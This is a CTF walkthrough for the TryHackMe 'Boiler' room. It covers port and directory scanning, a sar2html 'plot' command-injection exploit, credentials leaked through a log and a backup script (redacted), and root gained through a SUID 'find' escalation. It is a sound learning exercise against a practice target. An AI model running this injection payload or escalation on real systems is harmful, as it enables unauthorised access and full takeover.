@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>0xb0tm4n&#x27;s website</title>
+  <script src="https://cdn.jsdelivr.net/npm/js-cookie@3.0.5/dist/js.cookie.min.js"
+    integrity="sha256-WCzAhd2P6gRJF9Hv3oOOd+hFJi/QJbv+Azn4CGB8gfY=" crossorigin="anonymous" defer></script>
+  <script src="/js/index.js" defer></script>
+  <script src="/js/prompt.js" defer></script>
+  <script src="/js/keyboard.js" defer></script>
+  <script src="/js/tab.js" defer></script>
+  <script src="/js/commands.js" defer></script>
+  <script src="/js/config.js" defer></script><link rel="stylesheet" href="/css/base.css"><link rel="stylesheet" href="/css/page.css"></head><body onkeydown='exec(event)' style='background-image: url("/assets/background.jpg");'><main>
+      <div class="files" id="files" tabindex="0">
+<ul>
+  <li class="file">
+    <span><a href='https://super-botman.github.io/readme/'
+      tabindex="0">  README</a></span>
+  </li>
+
+<li class="folder"><span>
+      <a href='https://super-botman.github.io/pwn/'
+        tabindex="0">  Pwn
+      </a>
+    </span>
+
+    <ul>
+      
+      
+        
+        
+          
+<li>
+<span>└──
+  <a href='https://super-botman.github.io/pwn/writeups/'
+    tabindex="0">  Writeups
+  </a>
+</span>
+
+
+  <ul>
+
+  
+  <li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/robot/'
+        tabindex="0">  FCSC 2023 | Robot</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/bigorneau/'
+        tabindex="0">  FCSC 2025 | Bigorneau</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/http3/'
+        tabindex="0">  FCSC 2025 | HTTP3</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/small-prime-shellcode/'
+        tabindex="0">  FCSC 2025 | Small Prime Shellcode</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/aarchibald/'
+        tabindex="0">  Hackropole | Aarchibald</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/alfred/'
+        tabindex="0">  Hackropole | Alfred</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/armigo/'
+        tabindex="0">  Hackropole | Armigo</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/pwn103/'
+        tabindex="0">  THM | pwn101 task 103</a>
+    </span>
+  </li></ul>
+</li>
+
+        
+    </ul>
+  </li><li class="folder"><span>
+      <a href='https://super-botman.github.io/web/'
+        tabindex="0">  Web
+      </a>
+    </span>
+
+    <ul>
+      
+      
+        
+        
+          
+<li>
+<span>└──
+  <a href='https://super-botman.github.io/web/writeups/'
+    tabindex="0">  Writeups
+  </a>
+</span>
+
+
+  <ul>
+
+  
+  <li class="file">
+    <span>└──
+      <a class="selected"href='https://super-botman.github.io/web/writeups/boiler/'
+        tabindex="0">  THM | Boiler</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/web/writeups/thomghost/'
+        tabindex="0">  THM | Thomghost</a>
+    </span>
+  </li></ul>
+</li>
+
+        
+    </ul>
+  </li>
+</ul>
+</div>
+      <div class="viewer page" id="viewer" tabindex="0">
+        <div class="tab">
+<div class="file-manager" onclick='document.getElementById("files").classList.toggle("open"); document.getElementById("content").classList.toggle("close")'> </div>
+<ul id="tabs">
+</ul>
+
+
+</div>
+        <div class="content" id="content"><h1 id="boiler">Boiler</h1>
+<h2 id="nmap">NMAP</h2>
+<pre style="background-color:#1a1b26;color:#c0caf5;"><code><span>Open ports on 10.10.56.215:
+</span><span>
+</span><span>21/tcp    open  ftp
+</span><span>80/tcp    open  http
+</span><span>10000/tcp open  snet-sensor-mgmt
+</span><span>55007/tcp open  unknown
+</span><span>
+</span><span>&gt;&gt; Starting enumeration of discovered services
+</span><span>   this could take a while, sit tight!
+</span><span>
+</span><span>   - saving results in  /home/ismael/Documents/CTF/THM/Boiler/nmap/
+</span><span>
+</span><span>&gt;&gt; Scan done. Opening results for review...
+</span><span>
+</span><span>   # Nmap 7.92 scan initiated Wed Aug 31 18:22:39 2022 as: nmap -sC -sV -p21,80,10000,55007 -q -4 -oA /home/ismael/Documents/CTF/THM/Boiler/nmap/services 10.10.56.215
+</span><span>   Nmap scan report for 10.10.56.215
+</span><span>   Host is up (0.062s latency).
+</span><span>   
+</span><span>   PORT      STATE SERVICE VERSION
+</span><span>   21/tcp    open  ftp     vsftpd 3.0.3
+</span><span>   |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+</span><span>   | ftp-syst: 
+</span><span>   |   STAT: 
+</span><span>   | FTP server status:
+</span><span>   |      Connected to ::ffff:10.9.1.220
+</span><span>   |      Logged in as ftp
+</span><span>   |      TYPE: ASCII
+</span><span>   |      No session bandwidth limit
+</span><span>   |      Session timeout in seconds is 300
+</span><span>   |      Control connection is plain text
+</span><span>   |      Data connections will be plain text
+</span><span>   |      At session startup, client count was 4
+</span><span>   |      vsFTPd 3.0.3 - secure, fast, stable
+</span><span>   |_End of status
+</span><span>   80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
+</span><span>   | http-robots.txt: 1 disallowed entry 
+</span><span>   |_/
+</span><span>   |_http-title: Apache2 Ubuntu Default Page: It works
+</span><span>   |_http-server-header: Apache/2.4.18 (Ubuntu)
+</span><span>   10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
+</span><span>   |_http-title: Site doesn&#39;t have a title (text/html; Charset=iso-8859-1).
+</span><span>   55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+</span><span>   | ssh-hostkey: 
+</span><span>   |   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
+</span><span>   |   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
+</span><span>   |_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
+</span><span>   Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span>   
+</span><span>   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span>   # Nmap done at Wed Aug 31 18:23:18 2022 -- 1 IP address (1 host up) scanned in 39.12 seconds
+</span></code></pre>
+<h2 id="dirsearch">DIRSEARCH</h2>
+<pre style="background-color:#1a1b26;color:#c0caf5;"><code><span>  _|. _ _  _  _  _ _|_    v0.4.2
+</span><span> (_||| _) (/_(_|| (_| )
+</span><span>
+</span><span>Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 13441
+</span><span>
+</span><span>Output File: /home/ismael/.dirsearch/reports/10.10.56.215/_22-08-31_18-39-19.txt
+</span><span>
+</span><span>Error Log: /home/ismael/.dirsearch/logs/errors-22-08-31_18-39-19.log
+</span><span>
+</span><span>Target: http://10.10.56.215/
+</span><span>
+</span><span>[18:39:20] Starting: 
+</span><span>[18:42:28] 200 -   11KB - /index.html
+</span><span>[18:42:32] 301 -  313B  - /joomla  -&gt;  http://10.10.56.215/joomla/
+</span><span>[18:42:32] 301 -  327B  - /joomla/administrator  -&gt;  http://10.10.56.215/joomla/administrator/
+</span><span>[18:42:32] 200 -    5KB - /joomla/administrator/
+</span><span>[18:42:35] 200 -   12KB - /joomla/
+</span><span>[18:42:45] 301 -  313B  - /manual  -&gt;  http://10.10.56.215/manual/
+</span><span>[18:42:45] 200 -  626B  - /manual/
+</span><span>[18:42:45] 200 -  626B  - /manual/index.html
+</span><span>[18:43:12] 200 -  257B  - /robots.txt
+</span><span>
+</span><span>Task Completed
+</span><span>
+</span><span>┌──(ismael㉿kali)-[~/…/CTF/THM/Boiler/exploits]
+</span><span>└─$ dirsearch -u http://10.10.56.215/joomla  -e php -f -x 400,403
+</span><span>
+</span><span>  _|. _ _  _  _  _ _|_    v0.4.2
+</span><span> (_||| _) (/_(_|| (_| )
+</span><span>
+</span><span>Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 13441
+</span><span>
+</span><span>Output File: /home/ismael/.dirsearch/reports/10.10.56.215/-joomla_22-08-31_18-44-12.txt
+</span><span>
+</span><span>Error Log: /home/ismael/.dirsearch/logs/errors-22-08-31_18-44-12.log
+</span><span>
+</span><span>Target: http://10.10.56.215/joomla/
+</span><span>
+</span><span>[18:44:13] Starting: 
+</span><span>[18:44:47] 200 -    3KB - /joomla/Jenkinsfile
+</span><span>[18:44:47] 200 -   18KB - /joomla/LICENSE.txt
+</span><span>[18:44:48] 200 -    5KB - /joomla/README.txt
+</span><span>[18:44:49] 200 -    6KB - /joomla/README.md
+</span><span>[18:44:55] 301 -  320B  - /joomla/_files  -&gt;  http://10.10.56.215/joomla/_files/
+</span><span>[18:44:55] 200 -  168B  - /joomla/_files/
+</span><span>[18:44:57] 301 -  319B  - /joomla/_test  -&gt;  http://10.10.56.215/joomla/_test/
+</span><span>[18:44:58] 200 -    5KB - /joomla/_test/
+</span><span>[18:45:23] 301 -  327B  - /joomla/administrator  -&gt;  http://10.10.56.215/joomla/administrator/
+</span><span>[18:45:23] 200 -    5KB - /joomla/administrator/
+</span><span>[18:45:23] 200 -   31B  - /joomla/administrator/cache/
+</span><span>[18:45:23] 200 -    2KB - /joomla/administrator/includes/
+</span><span>[18:45:23] 301 -  332B  - /joomla/administrator/logs  -&gt;  http://10.10.56.215/joomla/administrator/logs/
+</span><span>[18:45:23] 200 -   31B  - /joomla/administrator/logs/
+</span><span>[18:45:24] 200 -    5KB - /joomla/administrator/index.php
+</span><span>[18:45:45] 301 -  317B  - /joomla/bin  -&gt;  http://10.10.56.215/joomla/bin/
+</span><span>[18:45:45] 200 -   31B  - /joomla/bin/
+</span><span>[18:45:48] 301 -  319B  - /joomla/build  -&gt;  http://10.10.56.215/joomla/build/
+</span><span>[18:45:48] 200 -    3KB - /joomla/build/
+</span><span>[18:45:48] 200 -    6KB - /joomla/build.xml
+</span><span>[18:45:49] 301 -  319B  - /joomla/cache  -&gt;  http://10.10.56.215/joomla/cache/
+</span><span>[18:45:49] 200 -   31B  - /joomla/cache/
+</span><span>[18:45:52] 200 -   31B  - /joomla/cli/
+</span><span>[18:45:53] 200 -    2KB - /joomla/codeception.yml
+</span><span>[18:45:53] 200 -   31B  - /joomla/components/
+</span><span>[18:45:53] 200 -    2KB - /joomla/composer.json
+</span><span>[18:45:53] 301 -  324B  - /joomla/components  -&gt;  http://10.10.56.215/joomla/components/
+</span><span>[18:45:54] 200 -    0B  - /joomla/configuration.php
+</span><span>[18:45:58] 200 -  117KB - /joomla/composer.lock
+</span><span>[18:46:13] 200 -    3KB - /joomla/htaccess.txt
+</span><span>[18:46:15] 301 -  320B  - /joomla/images  -&gt;  http://10.10.56.215/joomla/images/
+</span><span>[18:46:15] 200 -   31B  - /joomla/images/
+</span><span>[18:46:16] 301 -  322B  - /joomla/includes  -&gt;  http://10.10.56.215/joomla/includes/
+</span><span>[18:46:16] 200 -   31B  - /joomla/includes/
+</span><span>[18:46:16] 303 -    0B  - /joomla/index.php/login/  -&gt;  /joomla/index.php/component/users/?view=login&amp;Itemid=104
+</span><span>[18:46:16] 200 -   12KB - /joomla/index.php
+</span><span>[18:46:17] 301 -  326B  - /joomla/installation  -&gt;  http://10.10.56.215/joomla/installation/
+</span><span>[18:46:17] 200 -    6KB - /joomla/installation/
+</span><span>[18:46:21] 200 -    3KB - /joomla/karma.conf.js
+</span><span>[18:46:21] 301 -  322B  - /joomla/language  -&gt;  http://10.10.56.215/joomla/language/
+</span><span>[18:46:21] 200 -   31B  - /joomla/language/
+</span><span>[18:46:22] 200 -   31B  - /joomla/layouts/
+</span><span>[18:46:22] 301 -  323B  - /joomla/libraries  -&gt;  http://10.10.56.215/joomla/libraries/
+</span><span>[18:46:22] 200 -   31B  - /joomla/libraries/
+</span><span>[18:46:25] 301 -  319B  - /joomla/media  -&gt;  http://10.10.56.215/joomla/media/
+</span><span>[18:46:25] 200 -   31B  - /joomla/media/
+</span><span>[18:46:28] 301 -  321B  - /joomla/modules  -&gt;  http://10.10.56.215/joomla/modules/
+</span><span>[18:46:28] 200 -   31B  - /joomla/modules/
+</span><span>[18:46:39] 200 -    3KB - /joomla/phpunit.xml.dist
+</span><span>[18:46:40] 301 -  321B  - /joomla/plugins  -&gt;  http://10.10.56.215/joomla/plugins/
+</span><span>[18:46:40] 200 -   31B  - /joomla/plugins/
+</span><span>[18:46:44] 200 -  829B  - /joomla/robots.txt.dist
+</span><span>[18:46:53] 301 -  323B  - /joomla/templates  -&gt;  http://10.10.56.215/joomla/templates/
+</span><span>[18:46:53] 200 -   31B  - /joomla/templates/
+</span><span>[18:46:53] 200 -   31B  - /joomla/templates/index.html
+</span><span>[18:46:53] 200 -    0B  - /joomla/templates/beez3/
+</span><span>[18:46:53] 200 -    0B  - /joomla/templates/protostar/
+</span><span>[18:46:53] 200 -    0B  - /joomla/templates/system/
+</span><span>[18:46:54] 301 -  319B  - /joomla/tests  -&gt;  http://10.10.56.215/joomla/tests/
+</span><span>[18:46:54] 200 -    2KB - /joomla/tests/
+</span><span>[18:46:55] 301 -  317B  - /joomla/tmp  -&gt;  http://10.10.56.215/joomla/tmp/
+</span><span>[18:46:55] 200 -   31B  - /joomla/tmp/
+</span><span>[18:47:00] 200 -    2KB - /joomla/web.config.txt
+</span><span>[18:47:06] 301 -  318B  - /joomla/~www  -&gt;  http://10.10.56.215/joomla/~www/
+</span><span>[18:47:06] 200 -  162B  - /joomla/~www/
+</span><span>
+</span><span>Task Completed
+</span></code></pre>
+<h2 id="exploit">exploit</h2>
+<p>let's go see what is in <a href="http://10.10.56.215/joomla/_test/">http://10.10.56.215/joomla/_test/</a>,</p>
+<p><img src="/images/boiler/_test.png" alt="screenshot from _test" /></p>
+<p>ok, it's look like a sar2html page let's see if there is som exploit</p>
+<pre data-lang="zsh" style="background-color:#1a1b26;color:#c0caf5;" class="language-zsh "><code class="language-zsh" data-lang="zsh"><span style="color:#7aa2f7;">┌──(ismael㉿kali</span><span>)</span><span style="color:#7aa2f7;">-[</span><span style="color:#f7768e;">~</span><span style="color:#7aa2f7;">/…/CTF/THM/Boiler/exploits]
+</span><span style="color:#7aa2f7;">└─$ searchsploit sar2html
+</span><span style="color:#7aa2f7;">-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span><span> </span><span style="color:#7aa2f7;">Exploit Title                                                                                                                        </span><span style="color:#bb9af7;">|  </span><span style="color:#7aa2f7;">Path
+</span><span style="color:#7aa2f7;">-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span><span style="color:#7aa2f7;">sar2html 3.2.1 - </span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">plot</span><span style="color:#89ddff;">&#39;</span><span style="color:#7aa2f7;"> Remote Code Execution                                                                                         </span><span style="color:#bb9af7;">| </span><span style="color:#7aa2f7;">php/webapps/49344.py
+</span><span style="color:#7aa2f7;">Sar2HTML 3.2.1 - Remote Command Execution                                                                                             </span><span style="color:#bb9af7;">| </span><span style="color:#7aa2f7;">php/webapps/47204.txt
+</span><span style="color:#7aa2f7;">-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span><span style="color:#7aa2f7;">Shellcodes: No Results
+</span></code></pre>
+<p>let's see what is this exploit:</p>
+<pre data-lang="text" style="background-color:#1a1b26;color:#c0caf5;" class="language-text "><code class="language-text" data-lang="text"><span>───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span><span>       │ File: 47204.txt
+</span><span>───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span><span>   1   │ # Exploit Title: sar2html Remote Code Execution
+</span><span>   2   │ # Date: 01/08/2019
+</span><span>   3   │ # Exploit Author: Furkan KAYAPINAR
+</span><span>   4   │ # Vendor Homepage:https://github.com/cemtan/sar2html
+</span><span>   5   │ # Software Link: https://sourceforge.net/projects/sar2html/
+</span><span>   6   │ # Version: 3.2.1
+</span><span>   7   │ # Tested on: Centos 7
+</span><span>   8   │ 
+</span><span>   9   │ In web application you will see index.php?plot url extension.
+</span><span>  10   │ 
+</span><span>  11   │ http://&lt;ipaddr&gt;/index.php?plot=;&lt;command-here&gt; will execute
+</span><span>  12   │ the command you entered. After command injection press &quot;select # host&quot; then your command&#39;s
+</span><span>  13   │ output will appear bottom side of the scroll screen.
+</span><span>───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></code></pre>
+<p>ok, so we can use this exploit to run some commands, let's use the .py exploit:</p>
+<pre data-lang="text" style="background-color:#1a1b26;color:#c0caf5;" class="language-text "><code class="language-text" data-lang="text"><span>┌──(ismael㉿kali)-[~/…/CTF/THM/Boiler/exploits]
+</span><span>└─$ python3 49344.py
+</span><span>Enter The url =&gt; http://10.10.56.215/joomla/_test/
+</span><span>Command =&gt; ls -la
+</span><span>HPUX
+</span><span>Linux
+</span><span>SunOS
+</span><span>total 124
+</span><span>drwxr-xr-x  3 www-data www-data  4096 Aug 22  2019 .
+</span><span>drwxr-xr-x 25 www-data www-data  4096 Aug 22  2019 ..
+</span><span>-rwxr-xr-x  1 www-data www-data 53430 Aug 22  2019 index.php
+</span><span>-rwxr-xr-x  1 www-data www-data   716 Aug 21  2019 log.txt
+</span><span>-rwxr-xr-x  1 www-data www-data 53165 Mar 19  2019 sar2html
+</span><span>drwxr-xr-x  3 www-data www-data  4096 Aug 22  2019 sarFILE
+</span><span>
+</span><span>Command =&gt; cat log.txt
+</span><span>HPUX
+</span><span>Linux
+</span><span>SunOS
+</span><span>Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
+</span><span>Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
+</span><span>Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: &lt;pass&gt;
+</span><span>Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
+</span><span>Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
+</span><span>Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
+</span><span>Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
+</span><span>Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
+</span></code></pre>
+<p>and we get ssh logins so now it's privesc parts !</p>
+<h2 id="privesc">privesc</h2>
+<p>let's connect to ssh on ports 55007:</p>
+<pre data-lang="text" style="background-color:#1a1b26;color:#c0caf5;" class="language-text "><code class="language-text" data-lang="text"><span>┌──(ismael㉿kali)-[~/…/CTF/THM/Boiler/exploits]
+</span><span>└─$ ssh basterd@$IP -p 55007    
+</span><span>basterd@10.10.56.215&#39;s password: 
+</span><span>Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)
+</span><span>
+</span><span> * Documentation:  https://help.ubuntu.com
+</span><span> * Management:     https://landscape.canonical.com
+</span><span> * Support:        https://ubuntu.com/advantage
+</span><span>
+</span><span>8 packages can be updated.
+</span><span>8 updates are security updates.
+</span><span>
+</span><span>
+</span><span>Last login: Wed Aug 31 19:28:07 2022 from 10.9.1.220
+</span><span>$
+</span></code></pre>
+<p>and look arround</p>
+<pre data-lang="text" style="background-color:#1a1b26;color:#c0caf5;" class="language-text "><code class="language-text" data-lang="text"><span>$ ls
+</span><span>backup.sh
+</span></code></pre>
+<p>then we find a file called backup.h let's see what's insight:</p>
+<pre data-lang="bash" style="background-color:#1a1b26;color:#c0caf5;" class="language-bash "><code class="language-bash" data-lang="bash"><span>SOURCE</span><span style="color:#89ddff;">=</span><span style="color:#9ece6a;">/home/stoner
+</span><span>TARGET</span><span style="color:#89ddff;">=</span><span style="color:#9ece6a;">/usr/local/backup
+</span><span>
+</span><span>LOG</span><span style="color:#89ddff;">=</span><span style="color:#9ece6a;">/home/stoner/bck.log
+</span><span> 
+</span><span>DATE</span><span style="color:#89ddff;">=</span><span style="color:#9abdf5;">`</span><span style="color:#7aa2f7;">date +</span><span style="color:#89ddff;">%</span><span>y</span><span style="color:#89ddff;">\.%</span><span>m</span><span style="color:#89ddff;">\.%</span><span>d</span><span style="color:#89ddff;">\.</span><span style="color:#9abdf5;">`
+</span><span>
+</span><span>USER</span><span style="color:#89ddff;">=</span><span style="color:#9ece6a;">stoner
+</span><span style="color:#89ddff;">&lt;</span><span>pass</span><span style="color:#89ddff;">&gt;
+</span><span>
+</span><span style="color:#7aa2f7;">ssh </span><span style="color:#89ddff;">$</span><span>USER</span><span style="color:#7aa2f7;">@</span><span style="color:#89ddff;">$</span><span>REMOTE</span><span style="color:#7aa2f7;"> mkdir </span><span style="color:#89ddff;">$</span><span>TARGET</span><span style="color:#7aa2f7;">/</span><span style="color:#89ddff;">$</span><span>DATE
+</span><span>
+</span><span>
+</span><span style="color:#bb9af7;">if </span><span style="color:#2ac3de;">[ </span><span style="color:#89ddff;">-</span><span style="color:#e0af68;">d </span><span style="color:#89ddff;">&quot;$</span><span>SOURCE</span><span style="color:#89ddff;">&quot; </span><span style="color:#2ac3de;">]</span><span style="color:#bb9af7;">; then
+</span><span>    </span><span style="color:#bb9af7;">for</span><span> i </span><span style="color:#bb9af7;">in </span><span style="color:#9abdf5;">`</span><span style="color:#7aa2f7;">ls </span><span style="color:#89ddff;">$</span><span>SOURCE </span><span style="color:#bb9af7;">| </span><span style="color:#7aa2f7;">grep </span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">data</span><span style="color:#89ddff;">&#39;</span><span style="color:#9abdf5;">`</span><span style="color:#bb9af7;">;do
+</span><span>      </span><span style="color:#2ac3de;">echo </span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">Begining copy of</span><span style="color:#89ddff;">&quot; $</span><span>i  </span><span style="color:#89ddff;">&gt;&gt; $</span><span>LOG
+</span><span>      </span><span style="color:#7aa2f7;">scp  </span><span style="color:#89ddff;">$</span><span>SOURCE</span><span style="color:#7aa2f7;">/</span><span style="color:#89ddff;">$</span><span>i </span><span style="color:#89ddff;">$</span><span>USER</span><span style="color:#7aa2f7;">@</span><span style="color:#89ddff;">$</span><span>REMOTE</span><span style="color:#7aa2f7;">:</span><span style="color:#89ddff;">$</span><span>TARGET</span><span style="color:#7aa2f7;">/</span><span style="color:#89ddff;">$</span><span>DATE
+</span><span>      </span><span style="color:#2ac3de;">echo </span><span style="color:#89ddff;">$</span><span>i </span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">completed</span><span style="color:#89ddff;">&quot; &gt;&gt; $</span><span>LOG
+</span><span>  
+</span><span>  </span><span style="color:#bb9af7;">if </span><span style="color:#2ac3de;">[ </span><span style="color:#89ddff;">-</span><span style="color:#e0af68;">n </span><span style="color:#9abdf5;">`</span><span style="color:#7aa2f7;">ssh </span><span style="color:#89ddff;">$</span><span>USER</span><span style="color:#7aa2f7;">@</span><span style="color:#89ddff;">$</span><span>REMOTE</span><span style="color:#7aa2f7;"> ls </span><span style="color:#89ddff;">$</span><span>TARGET</span><span style="color:#7aa2f7;">/</span><span style="color:#89ddff;">$</span><span>DATE</span><span style="color:#7aa2f7;">/</span><span style="color:#89ddff;">$</span><span>i </span><span style="color:#ff9e64;">2</span><span style="color:#89ddff;">&gt;</span><span style="color:#7aa2f7;">/dev/null</span><span style="color:#9abdf5;">` </span><span style="color:#2ac3de;">]</span><span style="color:#bb9af7;">;then
+</span><span>      </span><span style="color:#7aa2f7;">rm </span><span style="color:#89ddff;">$</span><span>SOURCE</span><span style="color:#7aa2f7;">/</span><span style="color:#89ddff;">$</span><span>i
+</span><span>      </span><span style="color:#2ac3de;">echo </span><span style="color:#89ddff;">$</span><span>i </span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">removed</span><span style="color:#89ddff;">&quot; &gt;&gt; $</span><span>LOG
+</span><span>      </span><span style="color:#2ac3de;">echo </span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">####################</span><span style="color:#89ddff;">&quot; &gt;&gt; $</span><span>LOG
+</span><span>    </span><span style="color:#bb9af7;">else
+</span><span>     </span><span style="color:#2ac3de;">echo </span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">Copy not complete</span><span style="color:#89ddff;">&quot; &gt;&gt; $</span><span>LOG
+</span><span>     </span><span style="color:#2ac3de;">exit</span><span style="color:#7aa2f7;"> 0
+</span><span>  </span><span style="color:#bb9af7;">fi 
+</span><span>    </span><span style="color:#bb9af7;">done
+</span><span>
+</span><span style="color:#bb9af7;">else
+</span><span>
+</span><span>    </span><span style="color:#2ac3de;">echo </span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">Directory is not present</span><span style="color:#89ddff;">&quot; &gt;&gt; $</span><span>LOG
+</span><span>    </span><span style="color:#2ac3de;">exit</span><span style="color:#7aa2f7;"> 0
+</span><span style="color:#bb9af7;">fi
+</span><span style="color:#7aa2f7;">$ 
+</span></code></pre>
+<p>so we find some logins :</p>
+<pre style="background-color:#1a1b26;color:#c0caf5;"><code><span>  - user stoner
+</span><span>  - pass &lt;pass&gt;
+</span></code></pre>
+<p>try to use it's :</p>
+<pre data-lang="text" style="background-color:#1a1b26;color:#c0caf5;" class="language-text "><code class="language-text" data-lang="text"><span>$ su stoner
+</span><span>Password: &lt;pass&gt;
+</span><span>stoner@Vulnerable:/home/basterd$ 
+</span></code></pre>
+<p>and let's go we are stoner now, get the flag :</p>
+<pre data-lang="text" style="background-color:#1a1b26;color:#c0caf5;" class="language-text "><code class="language-text" data-lang="text"><span>stoner@Vulnerable:/home/basterd$ cd
+</span><span>stoner@Vulnerable:~$ ls -la
+</span><span>total 28
+</span><span>drwxr-x--- 5 stoner stoner 4096 Aug 31 20:11 .
+</span><span>drwxr-xr-x 4 root   root   4096 Aug 22  2019 ..
+</span><span>-rw------- 1 stoner stoner  438 Aug 31 20:11 .bash_history
+</span><span>drwxr-x--- 3 stoner stoner 4096 Aug 31 19:34 .config
+</span><span>drwx------ 2 stoner stoner 4096 Aug 31 19:35 .gnupg
+</span><span>drwxrwxr-x 2 stoner stoner 4096 Aug 22  2019 .nano
+</span><span>-rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret
+</span><span>stoner@Vulnerable:~$ cat .secret
+</span><span>&lt;flag&gt;
+</span><span>stoner@Vulnerable:~$ 
+</span></code></pre>
+<p>and let's find some SUID:</p>
+<pre data-lang="text" style="background-color:#1a1b26;color:#c0caf5;" class="language-text "><code class="language-text" data-lang="text"><span>stoner@Vulnerable:~$ find / -perm -u=s -type f 2&gt;/dev/null
+</span><span>/bin/su
+</span><span>/bin/fusermount
+</span><span>/bin/umount
+</span><span>/bin/mount
+</span><span>/bin/ping6
+</span><span>/bin/ping
+</span><span>/usr/lib/policykit-1/polkit-agent-helper-1
+</span><span>/usr/lib/apache2/suexec-custom
+</span><span>/usr/lib/apache2/suexec-pristine
+</span><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span><span>/usr/lib/openssh/ssh-keysign
+</span><span>/usr/lib/eject/dmcrypt-get-device
+</span><span>/usr/bin/newgidmap
+</span><span>/usr/bin/find
+</span><span>/usr/bin/at
+</span><span>/usr/bin/chsh
+</span><span>/usr/bin/chfn
+</span><span>/usr/bin/passwd
+</span><span>/usr/bin/newgrp
+</span><span>/usr/bin/sudo
+</span><span>/usr/bin/pkexec
+</span><span>/usr/bin/gpasswd
+</span><span>/usr/bin/newuidmap
+</span><span>stoner@Vulnerable:~$ 
+</span></code></pre>
+<p>and search at <a href="https://gtfobins.github.io/gtfobins/find/#sudo">GTFObins</a> for <code>find</code> :
+<img src="/images/boiler/GTFObins.png" alt="screenshot from gtfobins" /></p>
+<p>and use the cmd give by GTFObins:</p>
+<pre data-lang="text" style="background-color:#1a1b26;color:#c0caf5;" class="language-text "><code class="language-text" data-lang="text"><span>stoner@Vulnerable:~$ find . -exec /bin/bash -p \; -quit
+</span><span>bash-4.3# whoami
+</span><span>root
+</span></code></pre>
+<p>YESSS ! root !
+so let's get the flag :</p>
+<pre data-lang="text" style="background-color:#1a1b26;color:#c0caf5;" class="language-text "><code class="language-text" data-lang="text"><span>
+</span><span>bash-4.3# cd /root
+</span><span>bash-4.3# ls
+</span><span>root.txt
+</span><span>bash-4.3# cat root.txt
+</span><span>&lt;flag&gt;
+</span><span>bash-4.3# 
+</span></code></pre>
+<p><strong>And that's it, GG</strong></p>
+
+        </div>
+      </div>
+      <div class="prompt" id="terminal"><input
+    type="text"
+    id="setter"
+    onkeydown="writeit(this, event);moveIt(this.value.length, event)"
+    onchange="writeit(this, event)"
+    onkeyup="writeit(this, event)"
+    onkeypress="writeit(this, event);"
+    >
+<label for="setter" id="writer"> </label><b class="cursor" id="cursor"></b></div>
+    </main>
+  </body>
+
+</html>
